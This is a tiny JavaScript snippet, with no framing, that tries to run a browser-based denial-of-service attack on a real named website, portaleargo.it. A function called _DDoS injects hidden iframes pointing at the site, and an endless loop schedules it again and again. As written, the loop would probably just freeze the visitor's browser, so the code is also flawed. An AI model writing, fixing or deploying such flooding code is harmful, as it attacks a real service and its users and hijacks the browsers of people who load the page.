var url = ("portaleargo.it")

function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
for(;;){
 setTimeout('_DDoS("https://www.portaleargo.it/")',1);
}
